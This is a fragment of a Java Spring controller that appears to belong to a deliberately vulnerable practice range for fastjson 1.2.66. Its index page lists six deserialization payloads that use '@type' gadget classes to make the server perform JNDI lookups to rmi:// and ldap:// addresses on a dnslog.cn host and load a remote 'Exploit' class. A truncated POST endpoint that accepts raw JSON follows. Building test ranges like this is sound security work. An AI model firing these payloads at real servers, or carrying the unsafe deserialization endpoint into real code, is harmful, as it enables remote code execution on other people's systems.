...
public class FastjsonController {
    ...
    @GetMapping(value = {"/", "/fastjson-1.2.66"}, produces = "text/html;charset=UTF-8")
    @ResponseBody
    public String index() {
        return buildPage("fastjson-1.2.66 靶场测试页", "/fastjson1.2.66-process", new String[]{
                "{\"@type\":\"com.caucho.config.types.ResourceRef\",\"LookupName\":\"rmi://fastjson1.2.66-process.dnslog.cn/Exploit\"}",
                "{\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\",\"jndiNames\":\"ldap://fastjson1.2.66-process.dnslog.cn/Exploit\"}",
                "{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"healthCheckRegistry\":\"ldap://fastjson1.2.66-process.dnslog.cn/Exploit\"}",
                "{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"ldap://fastjson1.2.66-process.dnslog.cn/Exploit\"}",
                "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://fastjson1.2.66-process.dnslog.cn/Exploit\"}",
                "{\"@type\":\"org.apache.shiro.realm.jndi.JndiRealmFactory\", \"jndiNames\":[\"ldap://fastjson1.2.66-process.dnslog.cn/Exploit\"], \"Realms\":[\"\"]}"
        }, "{\"name\":\"123\",\"email\":\"123@123\",\"age\":\"123\"}");
    }

    @PostMapping("/fastjson1.2.66-process")
    public String fastjson1_2_66_process(@RequestBody String data) {
